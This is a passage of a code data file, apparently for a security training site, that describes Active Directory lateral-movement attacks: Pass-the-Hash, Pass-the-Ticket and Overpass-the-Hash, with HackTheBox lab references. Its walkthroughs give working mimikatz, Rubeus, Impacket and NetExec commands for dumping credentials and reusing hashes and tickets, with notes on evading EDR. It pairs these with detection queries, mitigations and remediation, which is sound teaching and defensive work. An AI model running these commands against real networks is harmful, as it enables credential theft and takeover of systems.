    name: 'Pass-the-Hash — Authenticating with NTLM Hash Only',
    shortName: 'Pass-the-Hash',
    category: 'Lateral Movement',
    severity: 'Critical',
    difficulty: 'Medium',
    publishedAt: '2025-05-15',
    author: 'Ahmed Tareq',
    readingTime: 12,
    labProvider: 'HackTheBox',
    labName: 'Lateral Movement — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adPthHero,
    summary:
      'Pass-the-Hash (PtH) abuses NTLM authentication: any service that accepts NTLM accepts the NT hash directly — no cleartext password required. Once an attacker dumps a hash from LSASS or SAM, they can authenticate to every Windows host that user can reach, often as local admin. PtH is the engine that drives ransomware lateral movement.',
    prerequisites: [
      'Local admin (or SYSTEM) on at least one Windows host to dump LSASS/SAM.',
      'Network reach to other Windows hosts on SMB (445), WMI (135), or WinRM (5985).',
      'Mimikatz / pypykatz / secretsdump on Windows OR Impacket on Linux.',
      'A target user with admin rights (or even just SMB rights) on remote hosts.',
    ],
    attackFlow: [
      'Compromise an initial host and elevate to local admin (UAC bypass, exploit, weak service).',
      'Dump NTLM hashes from LSASS (mimikatz sekurlsa::logonpasswords) or the SAM database.',
      'Identify which user has admin rights on remote hosts (BloodHound AdminTo edge).',
      'Authenticate to remote hosts using the hash via wmiexec / smbexec / psexec / evil-winrm.',
      'Repeat — dump hashes, hop, repeat — until Domain Admin is reached.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Dump NTLM hashes from LSASS',
        description:
          'On the compromised host, mimikatz pulls every cached credential from LSASS memory. We need elevated privileges (SeDebugPrivilege) which the privilege::debug command grants. logonpasswords prints every NT/AES hash and Kerberos ticket currently cached.',
        commands: [
          'mimikatz # privilege::debug',
          'mimikatz # sekurlsa::logonpasswords',
          '# Linux equivalent against a saved memory dump:\npypykatz lsa minidump lsass.dmp',
        ],
        output: 'User : svc-backup\nDomain : INLANEFREIGHT\nNTLM : 4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2',
      },
      {
        title: 'Step 2 — Pass the hash with Impacket (Linux)',
        description:
          'Impacket\'s wmiexec.py / psexec.py / smbexec.py all accept -hashes LM:NT (LM is unused — pad with empty value). One command and we have a SYSTEM shell on the target without ever knowing the password.',
        commands: [
          'wmiexec.py -hashes :4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 INLANEFREIGHT/svc-backup@10.10.10.50',
          'psexec.py -hashes :4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 INLANEFREIGHT/svc-backup@10.10.10.50',
        ],
        output: '[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell\nNT AUTHORITY\\SYSTEM',
      },
      {
        title: 'Step 3 — Mass-validate hash across the domain (NetExec)',
        description:
          'NetExec sweeps the entire subnet in seconds, telling us exactly where the hash grants admin (Pwn3d!). This is the lateral-movement multiplier — one command turns one credential into a target list.',
        commands: [
          'nxc smb 10.10.10.0/24 -u svc-backup -H 4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 --local-auth',
          'nxc smb 10.10.10.0/24 -u svc-backup -H 4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 -d INLANEFREIGHT',
        ],
        output: 'SMB  10.10.10.50  445  WS01  [+] INLANEFREIGHT\\svc-backup (Pwn3d!)\nSMB  10.10.10.51  445  WS02  [+] INLANEFREIGHT\\svc-backup (Pwn3d!)',
      },
      {
        title: 'Step 4 — Pass the hash from Windows (Mimikatz sekurlsa::pth)',
        description:
          'On a Windows beachhead, mimikatz sekurlsa::pth spawns a new process where LSASS thinks the supplied NT hash belongs to the chosen user. Any subsequent network auth from that process uses the hash automatically.',
        commands: [
          'mimikatz # sekurlsa::pth /user:svc-backup /domain:INLANEFREIGHT /ntlm:4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 /run:cmd',
          '# In the spawned shell:\ndir \\\\dc01\\c$',
        ],
      },
      {
        title: 'Step 5 — Dump the next host and repeat',
        description:
          'Once on the new host, repeat secretsdump to pull SAM hashes (local accounts) and LSA secrets (cached domain creds). Feed the new hash list into BloodHound to find the next AdminTo edge.',
        commands: [
          'secretsdump.py -hashes :4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 INLANEFREIGHT/svc-backup@10.10.10.50',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Mimikatz — dump LSASS', command: 'sekurlsa::logonpasswords' },
      { title: 'Mimikatz — pass hash', command: 'sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:cmd' },
      { title: 'Impacket — wmiexec PtH', command: 'wmiexec.py -hashes :<NT> DOMAIN/user@host' },
      { title: 'Impacket — psexec PtH', command: 'psexec.py -hashes :<NT> DOMAIN/user@host' },
      { title: 'NetExec — spray hash', command: 'nxc smb 10.0.0.0/24 -u <u> -H <NT> --local-auth' },
      { title: 'evil-winrm with hash', command: 'evil-winrm -i <ip> -u <u> -H <NT>' },
      { title: 'secretsdump — SAM + LSA', command: 'secretsdump.py -hashes :<NT> DOMAIN/user@host' },
    ],
    commandExplanations: [
      {
        command: 'wmiexec.py -hashes :4ec4b8e4d9d8e7e8e9d8c7b6a5d4c3b2 INLANEFREIGHT/svc-backup@10.10.10.50',
        purpose: 'Pass the NT hash over WMI/DCOM to get a semi-interactive shell on the target — no service install, no event 7045.',
        breakdown: [
          { flag: '-hashes :NT', meaning: 'LM:NT format. Empty LM (just colon) is correct for any modern Windows.' },
          { flag: 'DOMAIN/user@host', meaning: 'Authentication context — the user we are impersonating with the hash.' },
        ],
        why: 'WMI is quieter than psexec because it does NOT create a Windows service. It uses Win32_Process Create over DCOM — fewer endpoint/EDR artifacts.',
      },
      {
        command: 'sekurlsa::pth /user:svc-backup /domain:INLANEFREIGHT /ntlm:<hash> /run:cmd',
        purpose: 'Inject the NT hash into a new Windows process so any outgoing network auth uses it transparently.',
        breakdown: [
          { flag: '/user', meaning: 'The user identity to impersonate.' },
          { flag: '/ntlm', meaning: 'The NT hash to inject into LSASS for that identity.' },
          { flag: '/run', meaning: 'Process to spawn under the spoofed identity (cmd, powershell, etc).' },
        ],
        why: 'Native, in-memory, blends with normal Windows traffic — no Impacket binary on disk. Best technique on a Windows foothold.',
      },
      {
        command: 'nxc smb 10.10.10.0/24 -u svc-backup -H <NT> --local-auth',
        purpose: 'Sweep the subnet to find every host where this hash grants local admin (Pwn3d!).',
        breakdown: [
          { flag: '-H', meaning: 'NT hash for password-less auth.' },
          { flag: '--local-auth', meaning: 'Treat the user as a local account (not domain). Required when hash came from SAM.' },
        ],
        why: 'Local admin password reuse is the #1 finding in real engagements. One hash + this command frequently owns 50+ machines instantly.',
      },
    ],
    toolsExplained: [
      { name: 'Mimikatz', category: 'Credential Access / Windows', purpose: 'Dump and pass NTLM hashes natively.', why: 'sekurlsa::pth is the gold-standard PtH technique on Windows.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Impacket — wmiexec/psexec/smbexec', category: 'Lateral Movement', purpose: 'Authenticate to remote Windows with -hashes.', why: 'Cross-platform, scriptable, no agent on the target.', link: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (CrackMapExec)', category: 'Mass Validation', purpose: 'Spray a hash across hundreds of hosts in one command.', why: 'Pwn3d! flag instantly tells you where you have local admin.', link: 'https://www.netexec.wiki/' },
      { name: 'evil-winrm', category: 'Interactive Shell', purpose: 'WinRM shell with hash-based auth.', why: 'Cleanest interactive shell — much less noisy than psexec.', link: 'https://github.com/Hackplayers/evil-winrm' },
      { name: 'secretsdump.py', category: 'Credential Dumping', purpose: 'Pull SAM + LSA secrets remotely with a hash.', why: 'Each new host yields more hashes — fuels the lateral chain.', link: 'https://github.com/fortra/impacket' },
      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Find AdminTo edges to plot lateral routes.', why: 'Turns a single hash into a graph of every host it can compromise.', link: 'https://bloodhound.specterops.io' },
    ],
    enumerationDetection: [
      {
        title: 'LSASS access by non-Microsoft processes',
        description: 'PtH starts with a hash dump. Sysmon Event 10 catching unusual processes opening LSASS with credential-stealing access masks (0x1010, 0x1410, 0x1438, 0x1FFFFF) is the earliest signal.',
        eventIds: ['10'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1FFFFF")\n| where SourceImage !endswith "MsMpEng.exe"',
      },
      {
        title: 'Mimikatz / pypykatz on disk or in memory',
        description: 'Hunt for known offensive tooling and DLL imports. Many EDRs flag mimikatz.exe — but renamed binaries still load samlib.dll + cryptdll.dll into a non-LSA process.',
        eventIds: ['4688', '7'],
        dataSource: 'EDR / Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("sekurlsa","logonpasswords","pypykatz","secretsdump")\n   or ProcessVersionInfoInternalFileName has "mimikatz"',
      },
    ],
    socDetection: [
      {
        title: 'NTLM logon (4624 LogonType 3) with NULL workstation name',
        description: 'Impacket wmiexec/psexec leave a tell — the WorkstationName field on the 4624 NTLM logon is empty or randomly generated. Real Windows clients always send their hostname.',
        eventIds: ['4624'],
        dataSource: 'Member servers — Security log',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where AuthenticationPackageName == "NTLM"\n| where WorkstationName == "" or WorkstationName matches regex "^[A-Z0-9]{12,16}$"\n| project TimeGenerated, Account=TargetUserName, IpAddress, WorkstationName, Computer',
      },
      {
        title: 'Same account authenticating to many hosts in a short window',
        description: 'A single domain user generating 4624 LogonType 3 events on dozens of hosts within minutes is the textbook PtH lateral sweep — especially when the source IP is a workstation, not a jump server.',
        eventIds: ['4624'],
        dataSource: 'SIEM correlation',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4624 Logon_Type=3\n| stats dc(Computer) as hosts, values(Computer) as targets by Account_Name, Source_Network_Address, bin(_time, 10m)\n| where hosts > 5',
      },
      {
        title: 'PsExec service install (7045) burst',
        description: 'When PtH is delivered via psexec.py, every target gets a new service named PSEXESVC or random 8-char string with cmd.exe / 4-byte payload. A 7045 burst across the estate is a guaranteed lateral attack.',
        eventIds: ['7045'],
        dataSource: 'System log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'Event\n| where EventID == 7045\n| where ServiceName matches regex "^[A-Za-z0-9]{8}$" or ServiceFileName has_any ("psexesvc","\\\\.\\\\pipe\\\\")\n| summarize hosts=dcount(Computer) by bin(TimeGenerated, 30m)\n| where hosts > 3',
      },
      {
        title: 'WMI process creation from remote (Sysmon 1 with parent WmiPrvSE)',
        description: 'wmiexec spawns its commands as children of WmiPrvSE.exe. A WmiPrvSE child running cmd.exe with output redirected to a file (the wmiexec stdout pipe) is its signature.',
        eventIds: ['1'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'DeviceProcessEvents\n| where InitiatingProcessFileName =~ "WmiPrvSE.exe"\n| where ProcessCommandLine has "cmd.exe" and ProcessCommandLine has_any ("1>","\\\\\\\\127.0.0.1\\\\ADMIN$","Windows\\\\Temp\\\\")',
      },
    ],
    detection: [
      'Sysmon 10 — non-Microsoft process opening LSASS with credential-stealing GrantedAccess.',
      '4624 LogonType 3 + NTLM + empty/randomised WorkstationName.',
      'Single account → many hosts in <10m (lateral sweep).',
      '7045 service install burst across estate (psexec).',
      'WmiPrvSE.exe spawning cmd.exe with stdout pipe (wmiexec).',
      'NTLM auth occurring inside an environment that should be Kerberos-only.',
    ],
    mitigation: [
      'Enable Credential Guard (VBS) on every Windows 10/11 endpoint — isolates LSASS so mimikatz cannot read hashes.',
      'Deploy LAPS — every local admin account gets a unique random password, killing local-account PtH lateral movement.',
      'Disable NTLM where possible (GPO Network security: Restrict NTLM); mandate Kerberos.',
      'Tier-0/1/2 admin model — never log a Domain Admin into a tier-2 workstation.',
      'Add privileged accounts to Protected Users group (no NTLM, no cached creds, AES-only).',
      'Network segmentation: block inbound SMB/WMI/WinRM between user VLANs (east-west).',
    ],
    remediation: [
      'Identify every account whose hash was exposed (logged into the compromised host) and force-reset all of them.',
      'Reset krbtgt twice (10h apart) if any DA hash may have been exposed.',
      'Rebuild compromised hosts from gold images — assume LSASS and SAM are tainted.',
      'Pull 90 days of 4624 + 7045 logs from every host the cracked account touched and hunt for prior PtH.',
      'Rotate every local admin password (or deploy LAPS now).',
      'Audit which workstations the DA accounts logged into — those are tier-2 and must be rebuilt.',
    ],
    mitre: [
      { id: 'T1550.002', name: 'Pass the Hash', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { id: 'T1003.001', name: 'OS Credential Dumping — LSASS Memory', url: 'https://attack.mitre.org/techniques/T1003/001/' },
      { id: 'T1021.002', name: 'SMB / Admin Shares', url: 'https://attack.mitre.org/techniques/T1021/002/' },
    ],
    tools: ['Mimikatz', 'Impacket (wmiexec, psexec, smbexec, secretsdump)', 'NetExec', 'evil-winrm', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Lateral Movement', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1550.002', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { title: 'Microsoft — Credential Guard', url: 'https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/' },
      { title: 'Microsoft — LAPS', url: 'https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview' },
    ],
  },
  // ======================= PASS-THE-TICKET =======================
  {
    id: 'ad-pass-the-ticket',
    slug: 'ad-pass-the-ticket',
    name: 'Pass-the-Ticket — Reusing Stolen Kerberos Tickets',
    shortName: 'Pass-the-Ticket',
    category: 'Lateral Movement',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-16',
    author: 'Ahmed Tareq',
    readingTime: 11,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Attacks — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adPttHero,
    summary:
      'Pass-the-Ticket (PtT) reuses a Kerberos TGT or TGS that was stolen from a compromised host. Because the target service trusts any ticket signed by the KDC, the attacker walks straight in as the original user — until that ticket expires (default 10 hours). PtT is the Kerberos-equivalent of Pass-the-Hash and is the primary lateral-movement technique in Kerberos-only environments.',
    prerequisites: [
      'Local admin on a host where the victim user is currently logged in.',
      'Mimikatz / Rubeus to dump tickets from LSA cache (Windows).',
      'Or a stolen .ccache / .kirbi file you can copy to your attacker box.',
      'Network reach to the KDC (only for TGT renewal) and the target service.',
    ],
    attackFlow: [
      'Compromise a host where the victim has an active session (cached TGT/TGS in LSA).',
      'Dump tickets with mimikatz sekurlsa::tickets /export OR Rubeus dump.',
      'Pick a high-value TGT (e.g. Domain Admin) or a service TGS (e.g. cifs/dc01).',
      'Inject the ticket into the current session (kerberos::ptt or KRB5CCNAME).',
      'Authenticate to the target — the service decrypts and trusts the ticket.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Dump cached Kerberos tickets',
        description:
          'mimikatz sekurlsa::tickets /export pulls every cached TGT and TGS from LSA memory and saves them as .kirbi files in the current directory. Rubeus dump does the same on Windows in-memory and is friendlier to C2.',
        commands: [
          'mimikatz # privilege::debug',
          'mimikatz # sekurlsa::tickets /export',
          '# Or in-memory with Rubeus:\nRubeus.exe dump /nowrap',
          'Rubeus.exe dump /service:krbtgt /nowrap   # only TGTs',
        ],
        output: '[0;1e2a4]-2-0-40e10000-Administrator@krbtgt-INLANEFREIGHT.LOCAL.kirbi',
      },
      {
        title: 'Step 2 — Inject a TGT into your session (Windows)',
        description:
          'kerberos::ptt loads the .kirbi into the current LSA session. Any subsequent Kerberos auth from your shell now uses the victim TGT — net use, psexec, anything.',
        commands: [
          'mimikatz # kerberos::ptt Administrator@krbtgt-INLANEFREIGHT.LOCAL.kirbi',
          'mimikatz # kerberos::list',
          'C:\\> klist  # confirm ticket loaded\nC:\\> dir \\\\dc01\\c$  # use it',
        ],
      },
      {
        title: 'Step 3 — Use a stolen ticket from Linux',
        description:
          'Convert .kirbi → .ccache with impacket\'s ticketConverter.py, export KRB5CCNAME and you can run any Impacket tool with -k -no-pass.',
        commands: [
          'ticketConverter.py Administrator.kirbi Administrator.ccache',
          'export KRB5CCNAME=$PWD/Administrator.ccache',
          'psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@dc01.inlanefreight.local',
        ],
      },
      {
        title: 'Step 4 — Steal a TGS for a single service (lower noise)',
        description:
          'Sometimes a TGS is enough — and stealing one specific TGS instead of the TGT is much quieter (no DC interaction needed).',
        commands: [
          'Rubeus.exe dump /service:cifs/fileserver01 /nowrap',
          'Rubeus.exe ptt /ticket:<base64>',
          'C:\\> dir \\\\fileserver01\\share$',
        ],
      },
      {
        title: 'Step 5 — Renew the TGT to extend lifetime',
        description:
          'Default TGT lifetime is 10h, renewable up to 7 days. As long as you renew before expiry the ticket survives even if the user logs off.',
        commands: [
          'Rubeus.exe renew /ticket:<base64> /autorenew',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Mimikatz — dump tickets', command: 'sekurlsa::tickets /export' },
      { title: 'Mimikatz — inject', command: 'kerberos::ptt <file.kirbi>' },
      { title: 'Rubeus — dump (in-memory)', command: 'Rubeus.exe dump /nowrap' },
      { title: 'Rubeus — pass ticket', command: 'Rubeus.exe ptt /ticket:<base64>' },
      { title: 'Convert kirbi → ccache', command: 'ticketConverter.py file.kirbi file.ccache' },
      { title: 'Use ccache on Linux', command: 'export KRB5CCNAME=file.ccache && psexec.py -k -no-pass DOMAIN/user@host' },
      { title: 'Renew TGT', command: 'Rubeus.exe renew /ticket:<base64> /autorenew' },
    ],
    commandExplanations: [
      {
        command: 'sekurlsa::tickets /export',
        purpose: 'Iterate every LSA logon session and write each cached Kerberos ticket to disk as .kirbi.',
        breakdown: [
          { flag: 'sekurlsa::tickets', meaning: 'Read tickets from the SECURITY hive in memory (live).' },
          { flag: '/export', meaning: 'Write each ticket to a .kirbi file in CWD instead of just printing.' },
        ],
        why: 'Tickets are the keys to the kingdom on a multi-user host (RDP server, jump box). One mimikatz pass and you have every active user\'s TGT.',
      },
      {
        command: 'Rubeus.exe ptt /ticket:doIFXjC...base64',
        purpose: 'Inject a base64-encoded TGT into the current logon session via the Kerberos LsaCallAuthenticationPackage API.',
        breakdown: [
          { flag: 'ptt', meaning: 'Pass-The-Ticket — submit ticket to LSA so cmd / powershell uses it.' },
          { flag: '/ticket', meaning: 'Base64 of the .kirbi (no file on disk required — perfect for C2).' },
        ],
        why: 'In-memory injection leaves no .kirbi on disk; the ticket disappears when the process exits. Far stealthier than the mimikatz file-based workflow.',
      },
    ],
    toolsExplained: [
      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Dump and inject tickets natively.', why: 'sekurlsa::tickets + kerberos::ptt is the canonical PtT chain for two decades.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'In-memory ticket abuse.', why: 'C# / .NET — runs from C2, no disk artefacts, supports renewal & auto-renew.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Impacket — ticketConverter.py', category: 'Cross-platform', purpose: 'Convert kirbi ↔ ccache.', why: 'Bridges Windows-stolen tickets into Linux Impacket workflow.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — psexec/wmiexec', category: 'Lateral Movement', purpose: 'Use ccache (-k -no-pass) for Kerberos auth.', why: 'No extra credentials needed once the ticket is in the cache.', link: 'https://github.com/fortra/impacket' },
    ],
    enumerationDetection: [
      {
        title: 'LSA ticket-cache reading by non-system processes',
        description: 'Same Sysmon 10 telemetry as Pass-the-Hash but specifically watching for processes that open LSASS with read permissions and then never write back — classic sekurlsa::tickets behaviour.',
        eventIds: ['10'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1FFFFF")',
      },
    ],
    socDetection: [
      {
        title: 'Ticket used from a host that never received it (4624 without preceding 4769 on this host)',
        description: 'A real Kerberos auth produces a TGS-REQ (4769) on the DC moments before the service hits. PtT moves a ticket between hosts, so the TGS request comes from host A but the use comes from host B. Cross-host correlation surfaces this.',
        eventIds: ['4769', '4624'],
        dataSource: 'DC + member servers (correlation)',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'let tgs = SecurityEvent\n| where EventID == 4769\n| project tgsTime=TimeGenerated, TargetUserName, ServiceName, RequestorIp=IpAddress;\nlet logons = SecurityEvent\n| where EventID == 4624 and AuthenticationPackageName == "Kerberos" and LogonType == 3\n| project logonTime=TimeGenerated, TargetUserName, IpAddress, Computer;\nlogons\n| join kind=inner tgs on TargetUserName\n| where logonTime between (tgsTime .. tgsTime + 5m)\n| where IpAddress != RequestorIp\n| project logonTime, TargetUserName, IpAddress, RequestorIp, Computer, ServiceName',
      },
      {
        title: 'Anomalous source IP for high-privilege account',
        description: 'Domain Admins normally log in from a small set of jump boxes. A 4624 Kerberos logon for a DA from a workstation IP is a strong PtT indicator.',
        eventIds: ['4624'],
        dataSource: 'Member servers — Security log',
        queryLanguage: 'SPL',
        severity: 'Critical',
        query: 'index=wineventlog EventCode=4624 Logon_Type=3 AuthenticationPackageName=Kerberos\n| lookup priv_users.csv user as Account_Name OUTPUT priv\n| where priv="domain_admin"\n| stats values(IpAddress) as src by Account_Name\n| where mvcount(src) > 2',
      },
      {
        title: 'Ticket lifetime / renewal anomalies',
        description: 'Stolen tickets often get auto-renewed past usual user activity windows. Rubeus auto-renew at 4h before expiry creates a regular renewal pattern that idle users never produce.',
        eventIds: ['4770'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'Medium',
        query: 'SecurityEvent\n| where EventID == 4770\n| summarize renewals=count() by Account=TargetUserName, bin(TimeGenerated, 1h)\n| where renewals >= 6  // auto-renewed >= every hour for 6h',
      },
    ],
    detection: [
      'Cross-correlate 4769 (TGS-REQ source IP) with 4624 (Kerberos logon source IP) — mismatch = PtT.',
      'Domain Admin Kerberos logons from non-jump-box workstations.',
      'Continuous TGT renewals (4770) outside user activity hours.',
      'Sysmon 10 — LSASS access to read tickets.',
      'Rubeus / mimikatz command-line keywords: dump, ptt, kerberos::ptt.',
    ],
    mitigation: [
      'Credential Guard isolates LSA memory — mimikatz cannot dump tickets from a Credential-Guarded host.',
      'Add privileged accounts to Protected Users — TGT lifetime forced to 4h, no NTLM, no cached creds.',
      'Tier-0/1/2 model: privileged accounts only ever log into Tier-0 hosts (PAW + jump boxes).',
      'Disable RC4; force AES — tickets become harder to forge and easier to differentiate.',
      'Restrict who can DCSync — deny SeDelegateSessionUserImpersonatePrivilege except where required.',
    ],
    remediation: [
      'Identify the user(s) whose tickets were stolen and force a password reset (this invalidates the cached secret keys but NOT the live TGT).',
      'For DA-level theft: reset krbtgt twice (10h gap) — only this kills the TGT itself.',
      'Rebuild the host the tickets were stolen from — assume LSASS is poisoned.',
      'Pull 90 days of 4624 + 4769 + 4770 logs and hunt for PtT IP-mismatch patterns.',
      'Move the affected accounts into Protected Users and rotate any cached Kerberos secrets.',
    ],
    mitre: [
      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { id: 'T1558', name: 'Steal or Forge Kerberos Tickets', url: 'https://attack.mitre.org/techniques/T1558/' },
      { id: 'T1003.001', name: 'OS Credential Dumping — LSASS Memory', url: 'https://attack.mitre.org/techniques/T1003/001/' },
    ],
    tools: ['Mimikatz', 'Rubeus', 'Impacket (ticketConverter, psexec, wmiexec)'],
    references: [
      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1550.003', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { title: 'Microsoft — Protected Users group', url: 'https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group' },
    ],
  },
  // ======================= OVERPASS-THE-HASH =======================
  {
    id: 'ad-overpass-the-hash',
    slug: 'ad-overpass-the-hash',
    name: 'Overpass-the-Hash (Pass-the-Key) — NTLM Hash → Kerberos Ticket',
    shortName: 'Overpass-the-Hash',
    category: 'Lateral Movement',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-17',
    author: 'Ahmed Tareq',
    readingTime: 10,
    labProvider: 'HackTheBox',
    labName: 'Kerberos Attacks — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adOverpassHero,
    summary:
      'Overpass-the-Hash (a.k.a. Pass-the-Key) converts an NTLM hash into a fully valid Kerberos TGT. The attacker requests an AS-REP using the NT hash (or AES key) as the long-term key — the KDC happily issues a TGT. From that point on, all auth looks like normal Kerberos: no NTLM events, perfect for blending into Kerberos-only environments where straight PtH would be flagged.',
    prerequisites: [
      'NTLM hash (or AES128/256 key) of a domain user — from LSASS, secretsdump, or Kerberoasting.',
      'Mimikatz on Windows OR Impacket getTGT.py on Linux.',
      'Network reach to a Domain Controller on TCP/UDP 88.',
    ],
    attackFlow: [
      'Obtain an NTLM hash via PtH-style dump.',
      'Send a Kerberos AS-REQ using that hash as the long-term key.',
      'KDC returns a TGT — now you have a real Kerberos session for the user.',
      'Use the TGT (PtT) for any service in the domain — no NTLM seen on the wire.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Get the hash (via PtH dump)',
        description:
          'Already covered in the Pass-the-Hash room — same starting point. We need the NT hash or, better, the AES256 key (since modern domains may be AES-only).',
        commands: [
          'secretsdump.py -just-dc-user mmorgan INLANEFREIGHT.LOCAL/admin@10.10.10.161',
        ],
        output: 'mmorgan:1108:aad3b435...:cf3a5525c4...:::\nmmorgan:aes256-cts-hmac-sha1-96:7e2c4d8b1a...',
      },
      {
        title: 'Step 2 — Convert hash → TGT (Linux / Impacket)',
        description:
          'getTGT.py builds an AS-REQ using the NT hash as the secret key, sends it to the KDC and saves the resulting TGT as a .ccache file. Switch to -aesKey for AES-only domains.',
        commands: [
          'getTGT.py -hashes :cf3a5525c4...e9 INLANEFREIGHT.LOCAL/mmorgan',
          'getTGT.py -aesKey 7e2c4d8b1a...a INLANEFREIGHT.LOCAL/mmorgan',
        ],
        output: '[*] Saving ticket in mmorgan.ccache',
      },
      {
        title: 'Step 3 — Use the TGT (Pass-the-Ticket)',
        description:
          'Export KRB5CCNAME and any Impacket tool with -k -no-pass uses the TGT. Now every action is Kerberos — no NTLM events on the DC.',
        commands: [
          'export KRB5CCNAME=$PWD/mmorgan.ccache',
          'klist',
          'wmiexec.py -k -no-pass INLANEFREIGHT.LOCAL/mmorgan@ws01.inlanefreight.local',
        ],
      },
      {
        title: 'Step 4 — Overpass on Windows (Mimikatz / Rubeus)',
        description:
          'sekurlsa::pth supports overpass natively — give it /aes256 and /run:cmd, the spawned cmd has a real TGT in its session. Rubeus asktgt is the modern alternative, fully in-memory.',
        commands: [
          'mimikatz # sekurlsa::pth /user:mmorgan /domain:INLANEFREIGHT.LOCAL /aes256:<key> /run:powershell',
          'Rubeus.exe asktgt /user:mmorgan /aes256:<key> /domain:INLANEFREIGHT.LOCAL /ptt',
          'C:\\> klist  # TGT now in session',
          'C:\\> dir \\\\dc01\\c$',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — getTGT (NT hash)', command: 'getTGT.py -hashes :<NT> DOMAIN/user' },
      { title: 'Impacket — getTGT (AES key)', command: 'getTGT.py -aesKey <key> DOMAIN/user' },
      { title: 'Mimikatz — overpass', command: 'sekurlsa::pth /user:<u> /domain:<d> /aes256:<key> /run:cmd' },
      { title: 'Rubeus — asktgt + ptt', command: 'Rubeus.exe asktgt /user:<u> /aes256:<key> /domain:<d> /ptt' },
      { title: 'Use ccache', command: 'export KRB5CCNAME=user.ccache && wmiexec.py -k -no-pass DOMAIN/user@host' },
    ],
    commandExplanations: [
      {
        command: 'getTGT.py -hashes :cf3a5525c4...e9 INLANEFREIGHT.LOCAL/mmorgan',
        purpose: 'Authenticate to the KDC using the NT hash as the long-term Kerberos key and receive a real TGT in return.',
        breakdown: [
          { flag: '-hashes :NT', meaning: 'NT hash used as the encryption key for the AS-REQ pre-auth stamp.' },
          { flag: 'DOMAIN/user', meaning: 'Principal we are authenticating as — the hash must belong to this account.' },
        ],
        why: 'Once we have a TGT, all subsequent traffic is pure Kerberos — no 4624 NTLM events, no WorkstationName tells. Best stealth upgrade for PtH.',
      },
      {
        command: 'Rubeus.exe asktgt /user:mmorgan /aes256:<key> /domain:INLANEFREIGHT.LOCAL /ptt',
        purpose: 'Native Windows overpass — request a TGT using the AES256 key and inject straight into the current logon session.',
        breakdown: [
          { flag: 'asktgt', meaning: 'Send an AS-REQ to the KDC.' },
          { flag: '/aes256', meaning: 'Use AES256 key (preferred — survives RC4 disable and looks more legitimate).' },
          { flag: '/ptt', meaning: 'Pass-the-ticket the resulting TGT into the LSA cache automatically.' },
        ],
        why: 'AES256 is the etype real users have in modern domains — using it makes our forged session indistinguishable from a normal user logon.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — getTGT.py', category: 'Kerberos / Linux', purpose: 'Convert hash/key into TGT.', why: 'Cross-platform, scriptable, the de-facto Linux overpass tool.', link: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'sekurlsa::pth with /aes256 = native overpass.', why: 'Same syntax as PtH but produces a real TGT instead of injecting a hash.', link: 'https://github.com/gentilkiwi/mimikatz' },
